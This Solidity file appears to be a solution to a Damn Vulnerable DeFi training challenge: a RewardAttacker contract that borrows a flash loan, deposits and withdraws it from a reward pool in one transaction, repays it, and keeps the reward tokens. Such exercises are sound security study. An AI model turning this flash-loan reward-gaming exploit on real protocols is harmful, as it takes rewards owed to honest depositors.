// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./RewardToken.sol";

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;

    function withdraw(uint256 amountToWithdraw) external;
}

contract RewardAttacker {
    IFlashLoanerPool public immutable flashLoanPool;
    IRewardPool public immutable rewardPool;
    address payable owner;
    DamnValuableToken public immutable liquidityToken;
    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    constructor(
        address flashPoolAddress,
        address liquidityTokenAddress,
        address rewardPoolAddress,
        address rewardTokenAddress
    ) {
        flashLoanPool = IFlashLoanerPool(flashPoolAddress);
        rewardPool = IRewardPool(rewardPoolAddress);
        owner = payable(msg.sender);
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.increaseAllowance(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    receive() external payable {}
}
